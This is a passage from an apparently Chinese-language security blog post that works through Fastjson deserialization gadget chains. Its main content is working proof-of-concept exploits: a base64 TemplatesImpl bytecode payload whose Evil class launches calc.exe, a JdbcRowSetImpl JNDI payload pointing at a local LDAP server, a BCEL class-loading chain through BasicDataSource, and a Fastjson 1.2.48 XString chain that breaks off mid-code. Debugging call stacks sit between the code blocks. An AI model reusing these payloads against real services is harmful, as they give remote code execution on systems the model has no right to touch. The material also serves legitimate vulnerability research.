class="string">&quot;yv66vgAAADQAMgoABwAkCgAlACYIACcKACUAKAcAKQoABQAkBwAqAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACRMb3JnL2V4YW1wbGUvVGVtcGxhdGVzSW1wbERlbW8vRXZpbDsBAApFeGNlcHRpb25zBwArAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABGV2aWwBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAAIAAkHAC0MAC4ALwEACGNhbGMuZXhlDAAwADEBACJvcmcvZXhhbXBsZS9UZW1wbGF0ZXNJbXBsRGVtby9FdmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvbGFuZy9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACwAEAAwADQANAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAA8AAAAEAAEAFwABABEAGAACAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAFwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABkAGgACAAAAAQAbABwAAwAPAAAABAABABcACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAGgAIABsADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAEAABACIAAAACACM=&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;_name&#x27;<span class="punctuation">:</span> &#x27;c.c&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;_tfactory&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;allowedProtocols&quot;</span><span class="punctuation">:</span> <span class="string">&quot;all&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>POC.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.TemplatesImplDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">pocFile</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java_Sec\\FastjsonDemo\\src\\main\\java\\org\\example\\TemplatesImplDemo\\poc&quot;</span>;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(pocFile));</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        String temp;</span><br><span class="line">        <span class="keyword">while</span> ((temp = reader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            payload.append(temp);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload.toString(), Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>关于setter</li></ul><p>具体的图就不放了，这里是在set bytecode的调用堆栈，因为其声明为private且没有setter，得设置<code>Feature.SupportNonPublicField</code>参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">set:<span class="number">85</span>, UnsafeObjectFieldAccessorImpl (sun.reflect)</span><br><span class="line">set:<span class="number">758</span>, Field (java.lang.reflect)</span><br><span class="line">setValue:<span class="number">131</span>, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">83</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">773</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">188</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1293</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">137</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">193</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:<span class="number">197</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">22</span>, poc (org.example.fastjson1_2_24.TemplatesImplDemo)</span><br></pre></td></tr></table></figure><ul><li>关于base64编码_bytecode</li></ul><p>经过调试，fastjson在此处会进行base64解码获取字节</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051008617.png" alt="image-20250103213354164"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bytesValue:112, JSONScanner (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:136, ObjectArrayCodec (com.alibaba.fastjson.serializer)</span><br><span class="line">parseArray:723, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:177, ObjectArrayCodec (com.alibaba.fastjson.serializer)</span><br><span class="line">parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:193, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:197, JSON (com.alibaba.fastjson)</span><br><span class="line">main:22, poc (org.example.TemplatesImplDemo)</span><br></pre></td></tr></table></figure><h4 id="JdbcRowSetImpl类-JNDI注入（出网）"><a href="#JdbcRowSetImpl类-JNDI注入（出网）" class="headerlink" title="JdbcRowSetImpl类+JNDI注入（出网）"></a>JdbcRowSetImpl类+JNDI注入（出网）</h4><p>evil.class如上，然后起一个ldap服务，利用JdbcRowSetImpl的getter来RCE</p><p>JNDI那套了。。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.JdbcRowSetImplDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Basic/FromFile/Evil.class\&quot;, \&quot;autoCommit\&quot;:\&quot;false\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Bcel-动态类加载（不出网）"><a href="#Bcel-动态类加载（不出网）" class="headerlink" title="Bcel+动态类加载（不出网）"></a>Bcel+动态类加载（不出网）</h4><p>本质上是利用BasicDataSource拼接Bcel链子，因为BasicDataSource的getConnection中会进行loadClass</p><p>而getter正是利用fastjson中需要的，调试过程如下</p><p>在getConnection中跟进createDataSource</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051008589.png" alt="image-20250104131733344"></p><p>创建连接工厂对象</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051008870.png" alt="image-20250104131844097"></p><p>以<code>this.driverClassName</code>和<code>this.driverClassLoader</code>进行动态类加载</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501051008254.png" alt="image-20250104131929631"></p><p>调用堆栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">loadClass:135, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">forName0:-1, Class (java.lang)</span><br><span class="line">forName:340, Class (java.lang)</span><br><span class="line">createConnectionFactory:480, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">createDataSource:599, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">getConnection:809, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">main:50, poc (org.example.fastjson1_2_24.bcel)</span><br></pre></td></tr></table></figure><p>整体的Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.fastjson1_2_24.bcel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilFile</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java_Sec\\FastjsonDemo\\src\\main\\java\\org\\example\\fastjson1_2_24\\bcel\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] buffer;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(evilFile);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] temp = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        <span class="keyword">while</span>((n = fileInputStream.read(temp))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(temp, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">        byteArrayOutputStream.close();</span><br><span class="line">        buffer = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="comment">// System.out.println(Arrays.toString(buffer));</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(buffer, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 原来payload</span></span><br><span class="line">        <span class="comment">// classLoader.loadClass(&quot;$$BCEL$$&quot;+code).newInstance();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;DriverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + code + <span class="string">&quot;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;DriverClassLoader\&quot;:&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// System.out.println(s);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为了凑到Fastjson上, 需要找一条能拼凑loadClass的链子</span></span><br><span class="line">        <span class="comment">// BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line">        <span class="comment">// basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line">        <span class="comment">// basicDataSource.setDriverClassName(&quot;$$BCEL$$&quot;+code);</span></span><br><span class="line">        <span class="comment">// basicDataSource.getConnection();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//JSON.parseObject(s);</span></span><br><span class="line">        JSON.parseObject(s, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BasicDataSource中有专门的setter，所以不需要设置Feature.SupportNonPublicField</p><h3 id="Fastjson-1-2-48-toString"><a href="#Fastjson-1-2-48-toString" class="headerlink" title="Fastjson 1.2.48 toString"></a>Fastjson 1.2.48 toString</h3><p>反序列化fastjson toString打getter，依旧可以拼TemplatesImpl那条链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">链子: xString触发fastjson的toString打getter</span></span><br><span class="line"><span class="comment">readObject</span></span><br><span class="line"><span class="comment">    --&gt; hashmap.putVal</span></span><br><span class="line"><span class="comment">    --&gt; HotSwappableTargetSource.equals</span></span><br><span class="line"><span class="comment">            --&gt; XString.equals</span></span><br><span class="line"><span class="comment">                --&gt; JSON.toString</span></span><br><span class="line"><span class="comment">                ..</span></span><br><span class="line"><span class="comment">                    --&gt; TemplatesImpl.getOutputProperties</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.fastjson_1_2_48;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xStringExp</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">链子: xString触发fastjson的toString打getter</span></span><br><span class="line"><span class="comment">readObject</span></span><br><span class="line"><span class="comment">    --&gt; hashmap.putVal</span></span><br><span class="line"><span class="comment">    --&gt; HotSwappableTargetSource.equals</span></span><br><span class="line"><span class="comment">            --&gt; XString.equals</span></span><br><span class="line"><span class="comment">                --&gt; JSON.toString</span></span><br><span class="line"><span class="comment">                ..</span></span><br><span class="line"><span class="comment">                    --&gt; TemplatesImpl.getOutputProperties</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span>&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(),fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] evilBytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Java_Sec\\FastjsonDemo\\src\\main\\java\\org\\example\\fastjson_1_2_48\\Evil.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// sink</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilBytecodes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;hack&quot;</span>, templates);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s,<span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> 